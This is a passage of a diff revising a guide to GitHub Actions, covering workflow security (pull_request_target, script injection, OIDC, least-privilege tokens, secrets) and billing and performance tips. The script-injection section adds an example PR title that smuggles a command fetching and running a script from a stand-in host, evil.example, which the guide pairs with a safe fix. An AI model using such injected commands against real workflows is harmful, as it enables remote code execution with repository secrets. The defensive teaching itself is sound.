       issues: write
       pull-requests: write
     steps:
-      - uses: actions/stale@v9
+      - uses: actions/stale@v11
         with:
           stale-issue-message: "This issue has been automatically marked as stale after 60 days of inactivity."
           days-before-stale: 60
@@ -1015,19 +1023,22 @@ jobs:
 
 ### Third-Party Action Risks
 
-Every action you `uses` in a workflow runs with the same permissions as your workflow. A compromised or malicious action could exfiltrate secrets, modify your repository, or push malicious code. Treat third-party actions like third-party dependencies; they're code you're executing with elevated trust.
+Every action you `uses` in a workflow runs with the same permissions as your workflow. A compromised or malicious action could exfiltrate secrets, modify your repository, or push malicious code. Treat third-party actions like third-party dependencies, because they're code you're executing with elevated trust. Real compromises of popular actions have happened, where an attacker moved every version tag to malicious code, and workflows pinned to SHAs were the ones unaffected.
 
 Mitigations:
 
 - Pin actions to full commit SHAs rather than mutable tags
 - Prefer actions from well-known publishers (GitHub itself, major vendors) over unknown community actions
 - Review action source code before using it, especially for actions requesting broad permissions
-- Use [GitHub's dependency review action](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review){:target="_blank" rel="noopener noreferrer"} to flag new action additions in PRs
-- Configure Dependabot to keep action versions updated
+- Use [GitHub's dependency review action](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review){:target="_blank" rel="noopener noreferrer"} to flag newly added or vulnerable actions in PRs
+- Configure Dependabot to keep pinned action versions updated
+- Restrict which actions can run at all with the organization's allowed-actions policy
 
 ### The pull_request_target Danger
 
-`pull_request_target` runs workflows in the context of the base branch with write access to the repository, even for pull requests from forks. This makes it useful for tasks that need write access (like posting PR comments from forks), but it creates a serious risk: if you check out the PR's code and run it as part of a `pull_request_target` workflow, an attacker submitting a PR could execute arbitrary code with write access to your repository.
+`pull_request_target` runs the workflow file from the repository's default branch, with access to secrets and a token that can write, even for pull requests from forks. That makes it useful for tasks that need privileges, like labeling or commenting on PRs from forks. It becomes dangerous the moment the workflow checks out and runs the PR's code, because an attacker submitting a PR can then execute arbitrary code with those secrets and that token.
+
+GitHub has narrowed the risk twice. Since December 2025, the workflow file and the checkout commit for `pull_request_target` always come from the default branch, so an old vulnerable copy of the workflow on another branch can no longer be targeted. Since mid-2026, `actions/checkout` refuses to fetch fork PR code in `pull_request_target` and `workflow_run` workflows unless the step sets `allow-unsafe-pr-checkout`, an input named to stand out in code review. Neither change protects a workflow that deliberately opts in, or one that runs PR content some other way.
 
 The safe pattern separates untrusted code execution from privileged operations:
 
@@ -1040,52 +1051,94 @@ on:
     types: [completed]
 ```
 
-Never combine `pull_request_target` with steps that check out and execute the PR's code.
+The first workflow runs the untrusted code under `pull_request`, with a read-only token and no secrets, and uploads its results as an artifact. The second, triggered by `workflow_run`, has write access but only reads that artifact as data and never executes anything from it. Never combine `pull_request_target` with steps that check out and execute the PR's code.
+
+### Script Injection
+
+Expressions inside `${{ }}` are substituted into a `run` script before the shell sees it. When the value comes from something an outsider controls, such as a PR title, branch name, issue body, or commit message, the attacker controls part of your script:
+
+```yaml
+# Dangerous: a PR titled  a"; curl https://evil.example/x | sh; echo "  runs the attacker's command
+- run: echo "Checking ${{ github.event.pull_request.title }}"
+
+# Safe: pass the value through an environment variable, which the shell treats as data
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Checking $PR_TITLE"
+```
+
+The same rule applies to inputs of `workflow_dispatch` and to any `github.event` field that carries free text. Static analysis tools like CodeQL's Actions queries and [zizmor](https://github.com/zizmorcore/zizmor){:target="_blank" rel="noopener noreferrer"} flag these patterns automatically.
+
+### OIDC Instead of Stored Cloud Credentials
+
+Deploying to a cloud provider traditionally meant storing a long-lived access key as a secret, where it can leak and has to be rotated by hand. OpenID Connect (OIDC) removes the stored key. The job asks GitHub for a short-lived signed token that states which repository, branch, environment, and workflow it is running as, and the cloud provider exchanges that token for temporary credentials, but only if the claims match a trust policy you configured on the provider side.
+
+```yaml
+permissions:
+  id-token: write   # allows the job to request the OIDC token
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v6
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+          aws-region: us-east-1
+      - run: aws s3 sync ./site s3://my-bucket
+```
+
+The security of the setup lives in the provider's trust policy. It should match the token's `sub` claim narrowly, for example `repo:my-org/my-app:environment:production`, so that only deployments through the protected production environment can assume the production role. A policy that trusts any repository in the organization, or any branch, hands those credentials to far more code than intended. AWS, Azure, Google Cloud, and HashiCorp Vault all support this pattern through their own login actions.
 
 ### Least-Privilege GITHUB_TOKEN
 
-The `GITHUB_TOKEN` defaults to broader permissions than most workflows need. Restrict it explicitly:
+Depending on the repository's default setting, the `GITHUB_TOKEN` may have far broader permissions than a workflow needs. Restrict it explicitly:
 
 ```yaml
 permissions: {}  # Deny all by default at workflow level
 
 jobs:
   test:
+    runs-on: ubuntu-latest
     permissions:
       contents: read  # Only what this job actually needs
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
       - run: dotnet test
 
   comment:
+    needs: test
+    runs-on: ubuntu-latest
     permissions:
       pull-requests: write  # Only what this job actually needs
     steps:
       - name: Post results
-        run: gh pr comment ${{ github.event.number }} --body "Tests passed"
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh pr comment ${{ github.event.number }} --repo ${{ github.repository }} --body "Tests passed"
 ```
 
 Setting `permissions: {}` at the workflow level and then granting individual jobs only what they need is the safest posture.
 
 ### Secret Handling
 
-Secrets are masked in logs, but you can still accidentally expose them through other means. Don't echo secrets directly, pass them through files that get uploaded as artifacts, or include them in error messages. Pass secrets to steps via environment variables rather than command arguments, since arguments can sometimes appear in process listings.
-
-GitHub scans repositories for common secret patterns like API keys and notifies you when it finds them, but prevention is better than detection.
+Secrets are masked in logs, but you can still accidentally expose them through other means. Don't echo secrets directly, write them into files that get uploaded as artifacts, or include them in error messages. Pass secrets to steps through environment variables rather than command-line arguments, since arguments can appear in process listings. When a step derives a new sensitive value at runtime, register it for masking with `echo "::add-mask::$VALUE"` before anything prints it.
 
 ## Cost and Performance
 
 ### Free Tier and Billing
 
-GitHub Actions is free for public repositories with no minute limits. For private repositories, GitHub includes a free monthly allocation that depends on your plan, with additional minutes billed at per-minute rates that vary by runner type:
+Standard GitHub-hosted runners are free and unmetered for public repositories, and self-hosted runners are free everywhere. For private repositories, each plan includes a monthly allocation of minutes (2,000 on Free, 3,000 on Pro and Team, 50,000 on Enterprise Cloud), and usage beyond that is billed per minute at rates that depend on the runner. As of September 2026, the standard rates are:
 
-| Runner | Billing rate |
-|---|---|
-| Linux | 1x (baseline) |
-| Windows | 2x |
-| macOS | 10x |
+| Runner | Per minute | Relative to Linux |
+|---|---|---|
+| Linux (2 CPUs) | $0.006 | 1x |
+| Windows (2 CPUs) | $0.010 | About 1.7x |
+| macOS | $0.062 | About 10x |
 
-The billing implications push toward Linux runners where possible. A workflow that could run on Linux but uses Windows or macOS will cost significantly more at scale.
+These numbers change, so check the [Actions billing page](https://docs.github.com/en/billing/concepts/product-billing/github-actions){:target="_blank" rel="noopener noreferrer"} before budgeting. The ratios are more durable than the prices, and they push toward Linux wherever a job can run there. Larger runners are billed at higher rates and are never covered by the included minutes.
 
 ### Optimization Strategies
 
@@ -1093,11 +1146,11 @@ The billing implications push toward Linux runners where possible. A workflow th
 
 **Use concurrency groups to avoid waste.** When a developer pushes multiple commits in quick succession, older in-progress runs are often rendered irrelevant by the new push. `cancel-in-progress: true` on CI workflows stops paying for runs that will never matter.
 
-**Make jobs conditional.** A documentation change shouldn't trigger a full test suite run. Path filters on `push` and `pull_request` events prevent unnecessary executions. For monorepos, this is especially impactful; filter each workflow to only run on changes in its relevant directory.
+**Make jobs conditional.** A documentation change shouldn't trigger a full test suite run. Path filters on `push` and `pull_request` events prevent unnecessary executions, and in monorepos they matter most, because each workflow can run only on changes in its own directory.
 
-**Parallelize with matrix strategies.** If your test suite takes 10 minutes to run sequentially, splitting it into 5 parallel shards can bring wall time down to 2 minutes for the same cost. The total compute consumed is the same, but developers wait less.
+**Parallelize with matrix strategies.** If your test suite takes 10 minutes to run sequentially, splitting it into 5 parallel shards can bring wall time down to around 2 minutes. The compute consumed stays roughly the same, plus each shard's setup time and per-job rounding up to the next minute, but developers wait far less.
 
-**Pull common setup into composite actions.** When multiple workflows each install the same tools in the same way, they each pay that setup cost independently. A composite action that's already cached is faster than repeating setup steps.
+**Pull common setup into composite actions.** When multiple workflows each install the same tools in the same way, a composite action that includes caching makes every one of them fast, instead of each workflow tuning its own setup separately.
 
-**Choose `ubuntu-latest` as the default.** Unless you specifically need Windows or macOS capabilities, Linux is the fastest and cheapest option. The time savings from Linux runners compound across hundreds of workflow runs per month.
+**Choose `ubuntu-latest` as the default.** Unless you specifically need Windows or macOS capabilities, Linux is usually the fastest and cheapest option, and the savings compound across hundreds of workflow runs per month.
 {% endraw %}
